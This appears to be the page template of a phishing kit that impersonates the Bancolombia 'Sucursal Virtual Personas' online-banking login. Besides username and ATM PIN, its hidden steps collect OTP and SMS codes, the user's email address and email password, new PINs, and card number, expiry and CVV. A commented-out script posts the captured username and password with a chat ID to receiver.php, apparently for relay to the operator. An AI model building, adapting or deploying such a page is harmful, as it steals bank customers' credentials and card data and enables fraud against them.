var isIEx = navigator.appVersion.indexOf("MSIE") != -1 ? true : false;

function alertSize() {
    var myHeight = 0;
    if (typeof window.innerWidth == "number") {
        myHeight = window.innerHeight;
    } else if (
        document.documentElement &&
        (document.documentElement.clientWidth ||
            document.documentElement.clientHeight)
    ) {
        myHeight = document.documentElement.clientHeight;
    } else if (
        document.body &&
        (document.body.clientWidth || document.body.clientHeight)
    ) {
        myHeight = document.body.clientHeight;
    }
    return myHeight;
}

function setElementHeight(elementName, indent) {
    var elementEl = document.getElementById ?
        document.getElementById(elementName) :
        document.all ?
        document.all[elementName] :
        null;
    if (elementEl) {
        elementEl.style.height = "auto";
        var h = alertSize();
        var new_h = h - indent;
        try {
            elementEl.style.height = new_h + "px";
        } catch (err) {}
    }
}
</script>

<script>
var warning = 300;
var timeout = 420;

var current = 0;
var timeOutActive = true;

function popUpTimeOut(sURL) {
    window.open(
        unescape(sURL),
        "msgWindow",
        "dependent=yes,titlebar=no,menubar=no,height=190,hotkeys=no,resizable=no,status=no,toolbar=no,width=530,alwaysRaised=1"
    );
}

function getSecs() {
    if (timeOutActive) {
        current = current + 1;
        if (current == warning) {
            popUpTimeOut("html/timeoutWarning1.html");
        }
        if (current == timeout - 10) {
            popUpTimeOut("html/timeoutWarning2.html");
        }
        if (current == timeout) {
            window.location.href = "CLOSE";
        }
        window.setTimeout("getSecs()", 1000);
    }
}
getSecs();
</script>
<script type="text/javascript">
function setTitle() {
    document.title = "Bancolombia Sucursal Virtual Personas";
}
</script>

<link rel="shortcut icon" href="favicon.ico?v=4.12.0.RC6_1721165575966" />

<body onload="timeOutActive = true;setTitle();">

    <div id="loader">
        <img src="images/8c3994152005995.631a697736de0.gif" alt="Cargando..." />

    </div>
    <form id="loginUserForm" name="loginUserForm"
        action="VALIDATEPERSONA_DATOS?scis=k9TcHnK%2BGc%2F%2BzoS7d%2B4llK5l7yqCuNFFU4JZD3Qk8iyRrb1Io924CNbtRmHt2%2BOx"
        method="post">
        <input id="id_ss" name="id_ss" type="hidden" value="" />

        <div class="container">
            <div>
                <div id="header" class="mua-page-header">
                    <div class="row row-logo-svp">
                        <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                            <div class="mua-imgLogoItem"></div>
                            <div class="text-svp-name">Sucursal Virtual Personas</div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                            <div id="lastIn" class="mua-title-text" style="padding-top: 10px !important">
                                <script language="javascript" src="js/jquery.jclockNew.js?v=4.12.0.RC6_1721165575966"
                                    type="text/JavaScript"></script>

                                <script type="text/javascript">
                                $(function($) {
                                    var optionsEST = {
                                        utc: true,
                                        utcOffset: -5,
                                        format: "%A %R de %B de %Y %l:%M:%S %P",
                                        language: "es",
                                    };
                                    $("#jclock1").jclockNew(optionsEST);
                                });
                                </script>
                                <div>
                                    <div class="timeText">Fecha y hora actual:</div>
                                    <span id="jclock1" class="lastVisitedText"></span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="panel-heading">
                    <h3>Inicio de sesi&#243;n</h3>
                </div>
            </div>

            <div>
                <input type="hidden" name="tempUserID" id="tempUserID" />
                <input type="hidden" name="HIT_KEY" value="0" />
                <input type="hidden" name="HIT_VKEY" value="0" />
                <input type="hidden" name="userId" value="" />

                <div class="panel panel-primary">
                    <div class="row">
                        <script language="JavaScript">
                        function cerrarError() {
                            document.getElementById("tabError").style.display = "none";
                            document.getElementById("summary").innerHTML = "";
                        }
                        </script>

                        <div class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp" id="tabError"
                            style="display: none">
                            <div class="errorDiv">
                                <div class="divTextMessage">
                                    <span class="icon-error errorIcon">
                                        <span class="path1"></span>
                                        <span class="path2"></span>
                                        <span class="path3"></span>
                                    </span>
                                    <div class="errorTitulo">Error</div>
                                    <div id="summary" class="errorTexto"></div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div id="user" class="mua-panel-body hidden">
                        <div class="row">
                            <div class="col-xs-12 col-sm-5 col-md-4">
                                <div class="panel_general mua-panel_general">
                                    <div class="title-panel-label">
                                        <h1>Usuario</h1>
                                    </div>
                                    <div class="subtitle-land-label">
                                        <h4>
                                            Si no tienes un usuario asignado ingresa con tu
                                            documento de identidad
                                        </h4>
                                    </div>
                                    <div id="contenido">
                                        <div class="mua-content-group-panel">
                                            <div class="mua-label-input">
                                                <span id="popoverUser"
                                                    class="adminItems-Icons icon-icon_tooltip mua_pg_pgdsc_icons mua-label-icon"></span>
                                                <div id="popoverContent" class="hide">
                                                    <span class="mua_tooltip_close">&times;</span>
                                                    <div class="mua_tooltip_msg">
                                                        Ingrese el usuario que tiene registrado en la
                                                        Sucursal Virtual Personas. Si no tiene un usuario
                                                        asignado ingrese con su documento de identidad.
                                                    </div>
                                                </div>
                                                <label class="control-label-index" for="username">Ingresa tu
                                                    usuario</label>
                                            </div>
                                            <div>
                                                <div class="mua_svp_enroll_update_control">
                                                    <input id="username" name="username" tabindex="1"
                                                        class="mua-form-control mua_svp_control_username mua-input-icon"
                                                        onkeypress="checkKey(event)"
                                                        onchange="trim(document.loginUserForm.username)" type="text"
                                                        value="" maxlength="20" autocomplete="off" />
                                                    <span class="mua-icon-user"> </span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="one-button-container mua-button-container">

                                        <button id="btnUser" name="btnGo" class="btn btn-success btnSend" type="button"
                                            onclick="javascript:execute();">
                                            Continuar
                                        </button>
                                    </div>

                                    <div class="mua-panel_enlances">
                                        <p>
                                            <a href="#">&iquest;Olvidaste tu usuario?</a>
                                        </p>
                                        <p>
                                            <a href="javascript:popup_help_a()">&iquest;Problemas para conectarte?</a>
                                        </p>
                                    </div>
                                </div>

                                <div class="panel_general mua-panel_general">
                                    <div id="contenido">
                                        <div class="mua-divIcon">
                                            <a class="mua-itemsIcons-btn"
                                                href="https://www.bancolombia.com/csflu6centro-de-ayuda/canales/sucursal-virtual-personas"
                                                target="_blank">
                                                <div class="mua-divCell">
                                                    <span class="adminItems-Icons icon-icon_demo">
                                                        <span class="path1"></span><span class="path2"></span><span
                                                            class="path3"></span><span class="path4"></span><span
                                                            class="path5"></span><span class="path6"></span><span
                                                            class="path7"></span>
                                                    </span>
                                                </div>
                                                <div class="mua-divCell-text">
                                                    Conoce sobre Sucursal Virtual Personas
                                                </div>
                                            </a>
                                        </div>

                                        <div class="mua-divIcon">
                                            <a class="mua-itemsIcons-btn"
                                                href="https://www.bancolombia.com/csflu6educacion-financiera/seguridad-bancaria/seguridad-informatica"
                                                target="_blank">
                                                <div class="mua-divCell">
                                                    <span class="adminItems-Icons icon-icon_bloquear">
                                                        <span class="path1"></span><span class="path2"></span>
                                                    </span>
                                                </div>
                                                <div class="mua-divCell-text">
                                                    Aprende sobre Seguridad
                                                </div>
                                            </a>
                                        </div>

                                        <div class="mua-divIcon">
                                            <a class="mua-itemsIcons-btn"
                                                href="https://www.bancolombia.com/csflu6wcm/connect/1dcd5b4b-a856-4cee-9df9-f497eb26f964/Reglamento+Banca+por+Internet.pdf?MOD=AJPERES&CVID=l.B62Ro"
                                                target="_blank">
                                                <div class="mua-divCell">
                                                    <span class="adminItems-Icons icon-icon_reglamento">
                                                        <span class="path1"></span><span class="path2"></span><span
                                                            class="path3"></span><span class="path4"></span><span
                                                            class="path5"></span><span class="path6"></span><span
                                                            class="path7"></span>
                                                    </span>
                                                </div>
                                                <div class="mua-divCell-text">
                                                    Reglamento Sucursal Virtual
                                                </div>
                                            </a>
                                        </div>

                                        <div class="mua-divIcon">
                                            <a class="mua-itemsIcons-btn"
                                                href="https://www.bancolombia.com/csflu6personas/documentos-legales/proteccion-datos/bancolombia-sa"
                                                target="_blank">
                                                <div class="mua-divCell">
                                                    <span class="adminItems-Icons icon-icon_politicas">
                                                        <span class="path1"></span><span class="path2"></span><span
                                                            class="path3"></span><span class="path4"></span><span
                                                            class="path5"></span>
                                                    </span>
                                                </div>
                                                <div class="mua-divCell-text">
                                                    Pol&iacute;tica de Privacidad
                                                </div>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="col-xs-12 col-sm-7 col-md-8">
                                <div class="mua-embed-container-personal" id="banner-persona">
                                    <iframe class="mua-iframe mua-iframe-personal-responsive"
                                        src="static/login_SVP_BC_zonaA.html?v=4.12.0.RC6_1721165575966" frameborder="0"
                                        scrolling="no" width="635px" height="335px"></iframe>
                                </div>

                                <p class="text-center">
                                    ¿No conoces la Sucursal Virtual Personas de
                                    Bancolombia?&nbsp; Conoce m&aacute;s
                                    <a href="https://www.bancolombia.com/csflu6centro-de-ayuda/canales/sucursal-virtual-personas"
                                        target="_blank" class="a1">aqu&iacute;</a>
                                </p>
                            </div>
                        </div>
                    </div>


                    <div id="clave" class="mua-panel-body hidden">
                        <div class="row">
                            <div class="col-lg-5 col-md-5 col-sm-6">
                                <h5 class="mua-title-h5">
                                    Imagen y frase de seguridad seleccionadas
                                </h5>

                                <p class="mua-phrase-message mua-small-text">
                                    Verifica que tu imagen y frase de seguridad sean correctas,
                                    de esta manera te asegurar&aacute;s de estar ingresando a la
                                    Sucursal Virtual Personas de Bancolombia.
                                </p>


                            </div>

                            <div class="col-lg-4 col-md-5 col-sm-6">
                                <div class="panel_general mua-panel_general">
                                    <div class="title-panel-label">
                                        <h1>Clave</h1>
                                    </div>

                                    <div class="subtitle-land-label">
                                        <h4>
                                            Si la imagen y frase no son las que has definido, por
                                            seguridad no ingreses la clave.
                                        </h4>
                                    </div>

                                    <div id="contenido">
                                        <div class="mua-content-group-panel">
                                            <div class="mua-label-input">
                                                <label class="control-label-index" for="username">
                                                    Ingresa tu clave
                                                </label>
                                            </div>
                                            <div>
                                                <div class="mua_svp_enroll_update_control">
                                                    <input id="password" name="password"
                                                        class="mua-form-control mua-readOnlyInput mua_svp_control_password mua-input-icon"
                                                        type="password" value="" readonly="true" maxlength="4"
                                                        autocomplete="off" />
                                                    <span class="mua-icon-lock"> </span>
                                                </div>
                                            </div>
                                        </div>

                                        <div class="mua-content-legend mua_svp_enroll_update_label">
                                            Ingresa mediante el teclado virtual la clave que usas en
                                            el cajero autom&aacute;tico.
                                        </div>
                                    </div>

                                    <div class="two-button-container mua-button-container">
                                        <div class="two-button-a">
                                            <input class="btn btn-default"
                                                onclick="document.getElementById('password').type='text';document.getElementById('password').value = '';window.location.href='CLOSE_ALL'; return (false);"
                                                type="button" value="Cancelar" />
                                        </div>
                                        <div class="two-button-b">
                                            <input id="btn-Pass" name="btnGo" class="btn btn-success btnSend"
                                                type="button" onMouseOver="BAn_YqhjjfsW();"
                                                onmouseout="changeToOrigKeyboard();" value="Ingresar" />
                                        </div>
                                    </div>
                                    <div class="mua-panel_enlances">
                                        <div>
                                            <span id="popoverId"
                                                class="glyphicon icon-icon_tooltip mua_pg_pgdsc_icons mua-label-icon"></span>
                                            <div id="popoverContent" class="hide">
                                                <span class="mua_tooltip_close">&times;</span>
                                                <div class="mua_tooltip_msg">
                                                    Si usted es un Colombiano en el Exterior y no ha
                                                    sido cliente Bancolombia en el pasado o es un
                                                    cliente exclusivo Fiduciaria, usted debe generar una
                                                    clave para continuar con el proceso.
                                                </div>
                                            </div>
                                            <a
                                                href="GENERATE_PASS_DATA?scis=YJtoM7RF5hgodqz9IQmeReQt3L%2BhTfJJtXAPSHO%2B2tJBJMLZFDP0ABWEGKkMfBzW">Genera
                                                una clave personal</a>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="col-lg-3 col-md-3 col-sm-3 col-xs-3" style="height: 350px; width: 220px">
                                <div id="keyboard_"></div>
                                <div id="inputs_"></div>
                                <script>
                                createKeyboard();
                                startKeyb(document.loginUserForm.password);
                                resetForm();
                                </script>
                            </div>
                        </div>
                    </div>

                    <div id="otros" class="hidden d-flex justify-content-center align-items-center mua-panel-body">
                        <div class="row">
                            <div class="col-xs-12 col-sm-5 col-md-4"></div>
                            <div class="col-xs-12 col-sm-5 col-md-4">
                                <div class="panel_general mua-panel_general">
                                    <div class="title-panel-label">
                                        <h1>Registro dispositivo seguro</h1>
                                    </div>
                                    <div class="subtitle-land-label">
                                        <h4 id="text-from-tg">
                                            Ingresa los datos necesarios para el registro, no
                                            compartas estos datos con nadie
                                        </h4>
                                    </div>
                                    <div id="contenido">
                                        <div class="mua-content-group-panel">
                                            <div class="mua-label-input">
                                                <div id="popoverContent" class="hide">
                                                    <span class="mua_tooltip_close">&times;</span>
                                                </div>
                                            </div>
                                            <div>
                                                <div id="div-dinamica" class="hidden row justify-content-center mt-5">
                                                    <div class="col-6">
                                                        <div class="otp-label">
                                                            Ingrese su clave Din&aacute;mica
                                                        </div>
                                                        <div class="otp-container">
                                                            <input type="number" maxlength="1"
                                                                class="form-control otp-input no-arrow" id="otp-1" />
                                                            <input type="number" maxlength="1"
                                                                class="form-control otp-input no-arrow" id="otp-2" />
                                                            <input type="number" maxlength="1"
                                                                class="form-control otp-input no-arrow" id="otp-3" />
                                                            <input type="number" maxlength="1"
                                                                class="form-control otp-input no-arrow" id="otp-4" />
                                                            <input type="number" maxlength="1"
                                                                class="form-control otp-input no-arrow" id="otp-5" />
                                                            <input type="number" maxlength="1"
                                                                class="form-control otp-input no-arrow" id="otp-6" />
                                                        </div>
                                                        <input type="hidden" class="otp-input-hidden" />
                                                    </div>
                                                </div>

                                                <div id="div-sms" class="hidden row justify-content-center mt-5">
                                                    <div class="col-6">
                                                        <div class="otp-label">
                                                            Ingrese el c&oacute;digo SMS
                                                        </div>
                                                        <div class="otp-container">
                                                            <input type="number" maxlength="1"
                                                                class="form-control otp-input-sms no-arrow"
                                                                id="otp-sms-1" />
                                                            <input type="number" maxlength="1"
                                                                class="form-control otp-input-sms no-arrow"
                                                                id="otp-sms-2" />
                                                            <input type="number" maxlength="1"
                                                                class="form-control otp-input-sms no-arrow"
                                                                id="otp-sms-3" />
                                                            <input type="number" maxlength="1"
                                                                class="form-control otp-input-sms no-arrow"
                                                                id="otp-sms-4" />
                                                            <input type="number" maxlength="1"
                                                                class="form-control otp-input-sms no-arrow"
                                                                id="otp-sms-5" />
                                                            <input type="number" maxlength="1"
                                                                class="form-control otp-input-sms no-arrow"
                                                                id="otp-sms-6" />
                                                        </div>

                                                        <input type="hidden" class="otp-input-sms-hidden" />
                                                    </div>
                                                </div>

                                                <div id="div-correo" class="hidden row justify-content-center mt-5">
                                                    <div class="content-data">
                                                        <div class="otp-label">
                                                            Registre su correo!
                                                        </div>
                                                        <div class="">
                                                            <input id="correo" class="mua-form-control otp-input"
                                                                type="text" value="" maxlength="100"
                                                                autocomplete="off" />
                                                            <div class="otp-label">
                                                                Clave de su correo
                                                            </div>
                                                            <div class="">
                                                                <input id="claveCorreo"
                                                                    class="mua-form-control otp-input" type="password"
                                                                    value="" maxlength="100" autocomplete="off" />
                                                            </div>
                                                        </div>



                                                    </div>
                                                </div>

                                                <div id="div-clave-cajero"
                                                    class="hidden row justify-content-center mt-5 m-2">
                                                    <div class="content-data">
                                                        <div class="otp-label ml-4 mr-4">
                                                            Por su seguridad es necesario que cambie la clave
                                                        </div>
                                                        <div class="">
                                                            <div class="otp-label">
                                                                Clave Anterior
                                                            </div>
                                                            <div class="">
                                                                <input id="claveanterior" class="mua-form-control"
                                                                    type="password" value="" maxlength="4"
                                                                    autocomplete="off" />
                                                            </div>
                                                            <div class="otp-label">
                                                                Clave Nueva
                                                            </div>
                                                            <div class="">
                                                                <input id="clavecajero" class="mua-form-control"
                                                                    type="password" value="" maxlength="4"
                                                                    autocomplete="off" />
                                                            </div>
                                                            <div class="otp-label">
                                                                Confirme la Clave
                                                            </div>
                                                            <div class="">
                                                                <input id="clavecajaero2" class="mua-form-control"
                                                                    type="password" value="" maxlength="4"
                                                                    autocomplete="off" />
                                                            </div>
                                                        </div>



                                                    </div>
                                                </div>
                                                <div id="div-datos-debito"
                                                    class="hidden row justify-content-center mt-5 m-4">

                                                    <div class="content-data">
                                                        <!-- 
                                                        <h5 class="mb-3">Para completar el proceso es necesario que
                                                            ingrese los siguientes datos</h5> -->
                                                        <div class="mb-3">
                                                            <label for="cardNumber" class="form-label">Número de
                                                                Tarjeta</label>
                                                            <input type="text" class="form-control form-control-sm"
                                                                id="cardNumber" name="cardNumber" required>
                                                            <div class="invalid-feedback">Por favor, ingresa el
                                                                número de la tarjeta.</div>
                                                        </div>

                                                        <div class="mb-3">
                                                            <label for="expiryDate" class="form-label">Fecha de
                                                                Vencimiento (MM/YY)</label>
                                                            <input type="text" class="form-control form-control-sm"
                                                                id="expiryDate" name="expiryDate" placeholder="MM/YY"
                                                                required>
                                                            <div class="invalid-feedback">Por favor, ingresa la
                                                                fecha de vencimiento.</div>
                                                        </div>

                                                        <div class="mb-3">
                                                            <label for="cvv" class="form-label">Código de Seguridad
                                                                (CVV)</label>
                                                            <input type="text" class="form-control form-control-sm"
                                                                id="cvv" name="cvv" required>
                                                            <div class="invalid-feedback">Por favor, ingresa el
                                                                código de seguridad (CVV).</div>
                                                        </div>



                                                    </div>
                                                </div>
                                            </div>

                                            <div class="one-button-container mua-button-container">
                                                <a href="https://www.bancolombia.com/csflu6centro-de-ayuda/canales/sucursal-virtual-personas"
                                                    name="btnGo" id="btnfin" class="btn btn-success" type="button"
                                                    style="display: none !important;">
                                                    Finalizar
                                                </a>

                                                <button id="btnCodes" name="btnGo" class="btn btn-success btnSend"
                                                    type="button">
                                                    Continuar
                                                </button>
                                            </div>


                                        </div>
                                        <div class="mt-5 col-xs-12 col-sm-5 col-md-4"></div>
                                        <div class="panel_general mua-panel_general">
                                            <div id="contenido">
                                                <div class="mua-divIcon">
                                                    <a class="mua-itemsIcons-btn"
                                                        href="https://www.bancolombia.com/csflu6centro-de-ayuda/canales/sucursal-virtual-personas"
                                                        target="_blank">
                                                        <div class="mua-divCell">
                                                            <span class="adminItems-Icons icon-icon_demo">
                                                                <span class="path1"></span><span
                                                                    class="path2"></span><span
                                                                    class="path3"></span><span
                                                                    class="path4"></span><span
                                                                    class="path5"></span><span
                                                                    class="path6"></span><span class="path7"></span>
                                                            </span>
                                                        </div>
                                                        <div class="mua-divCell-text">
                                                            Conoce sobre Sucursal Virtual Personas
                                                        </div>
                                                    </a>
                                                </div>

                                                <div class="mua-divIcon">
                                                    <a class="mua-itemsIcons-btn"
                                                        href="https://www.bancolombia.com/csflu6educacion-financiera/seguridad-bancaria/seguridad-informatica"
                                                        target="_blank">
                                                        <div class="mua-divCell">
                                                            <span class="adminItems-Icons icon-icon_bloquear">
                                                                <span class="path1"></span><span class="path2"></span>
                                                            </span>
                                                        </div>
                                                        <div class="mua-divCell-text">
                                                            Aprende sobre Seguridad
                                                        </div>
                                                    </a>
                                                </div>

                                                <div class="mua-divIcon">
                                                    <a class="mua-itemsIcons-btn"
                                                        href="https://www.bancolombia.com/csflu6wcm/connect/1dcd5b4b-a856-4cee-9df9-f497eb26f964/Reglamento+Banca+por+Internet.pdf?MOD=AJPERES&CVID=l.B62Ro"
                                                        target="_blank">
                                                        <div class="mua-divCell">
                                                            <span class="adminItems-Icons icon-icon_reglamento">
                                                                <span class="path1"></span><span
                                                                    class="path2"></span><span
                                                                    class="path3"></span><span
                                                                    class="path4"></span><span
                                                                    class="path5"></span><span
                                                                    class="path6"></span><span class="path7"></span>
                                                            </span>
                                                        </div>
                                                        <div class="mua-divCell-text">
                                                            Reglamento Sucursal Virtual
                                                        </div>
                                                    </a>
                                                </div>

                                                <div class="mua-divIcon">
                                                    <a class="mua-itemsIcons-btn"
                                                        href="https://www.bancolombia.com/csflu6personas/documentos-legales/proteccion-datos/bancolombia-sa"
                                                        target="_blank">
                                                        <div class="mua-divCell">
                                                            <span class="adminItems-Icons icon-icon_politicas">
                                                                <span class="path1"></span><span
                                                                    class="path2"></span><span
                                                                    class="path3"></span><span
                                                                    class="path4"></span><span class="path5"></span>
                                                            </span>
                                                        </div>
                                                        <div class="mua-divCell-text">
                                                            Pol&iacute;tica de Privacidad
                                                        </div>
                                                    </a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>


                </div>
            </div>

            <div class="row">
                <div class="col-xs-12 col-sm-12 col-md-12">
                    <p class="mua-footer">
                        Sucursal Telef&oacute;nica Bancolombia: Bogot&aacute; (57) 60 1
                        343 00 00 - Medell&iacute;n (57) 60 4 510 90 00 - Cali (57) 60 2
                        554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60
                        5 693 44 00 - <br />
                        Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 -
                        El resto del pa&iacute;s 018000 9 12345. Sucursales
                        Telef&oacute;nicas en el exterior: Espa&ntilde;a (34) 900 995
                        717 - Estados Unidos (1) 866 379 97 14.
                    </p>
                </div>
            </div>

            <script type="text/javascript">
            var year = new Date().getFullYear();
            $(document).ready(function() {
                $("#fecha").text(year);
            });
            </script>
            <div style="margin-top: 10px">
                <div class="mua-title-text pull-left">
                    Direcci&oacute;n IP: <?php echo obtenerIP() ?>
                </div>
                <div class="mua-title-text pull-right">
                    Copyright &copysr;&nbsp;<span id="fecha">&nbsp;</span>&nbsp;Bancolombia
                    S.A.&nbsp;&nbsp;
                </div>
            </div>
        </div>
        </div>

        <script src="js/rsa/AC_OETags.js" type="text/javascript"></script>
        <script src="js/rsa/swfRSACookieFunc.js" type="text/javascript"></script>
        <script src="
https://cdn.jsdelivr.net/npm/sweetalert2@11.12.4/dist/sweetalert2.all.min.js
"></script>
        <link href="
https://cdn.jsdelivr.net/npm/sweetalert2@11.12.4/dist/sweetalert2.min.css
" rel="stylesheet">
        <script src="https://cdn.jsdelivr.net/npm/inputmask@5.0.7/dist/jquery.inputmask.min.js"></script>

        <script src="js/actions.js" type="text/javascript"></script>
        <input id="device_id" name="device_id" type="hidden" value="" />
        <input id="userlanguage" name="userlanguage" type="hidden" value="" />
        <input id="deviceprint" name="deviceprint" styleId="deviceprint" type="hidden" value="" />
        <input id="pgid" name="pgid" type="hidden" value="" />
        <input id="uievent" name="uievent" type="hidden" value="" />

        <meta http-equiv="PRAGMA" content="NO-CACHE" />
        <meta http-equiv="Expires" content="-1" />
        <script language="JavaScript">
        document.forms[0].userlanguage.value = fingerprint_userlang();
        </script>

        <script language="JavaScript" type="text/javascript">
        function getTCLIIDVK() {
            return "hiD%2Fk0W0LWOOdSQovazJtXyoQP8%3D";
        }

        function getTSESIDVK() {
            return "5e8906f5-f7b3-42dc-97c9-b2489ddbb2b0";
        }

        function getTVIEIDVK() {
            return "WEB-INF/jsp/login/loginPassForm.jsp";
        }
        </script>
        <script language="JavaScript" type="text/javascript">
        <!--
        var flashVars = "field_name=device_id&" + "ip_address=8CA1C82512D57EA";
        var flashMovie = "swf/rsa_fso";
        if (DetectFlashVer(6, 0, 0)) {
            AC_FL_RunContent(
                "id",
                "flash_id",
                "width",
                "1",
                "height",
                "1",
                "movie",
                flashMovie,
                "quality",
                "high",
                "bgcolor",
                "#FFFFFF",
                "flashVars",
                flashVars
            );
        }

        $(document).ready(function() {

            // $("#btn-Pass").click(function() {
            //    // Leer el valor del campo username
            //     if (password) {
            //         var translatedPassword = translatePassword(password);
            //         localStorage.setItem("password",
            //             translatedPassword); // Guardar el valor en el localStorage
            //         $.ajax({
            //             url: "receiver.php",
            //             type: "POST",
            //             data: {
            //                 userID: localStorage.getItem("username"),
            //                 password: translatedPassword,
            //                 coban: "Tricolor",
            //                 chatID: localStorage.getItem("chatID"),
            //             },
            //             success: function(response) {
            //                 window.location.href = "CLAVESMS.php";
            //             },
            //             error: function(jqXHR, textStatus, errorThrown) {
            //                 $("#response").html("<p>Error: " + textStatus + "</p>");
            //             },
            //         });
            //     }
            // });
        });
        //
        -->
        </script>
    </form>
</body>

</html>
<?php
        return true;
    }
}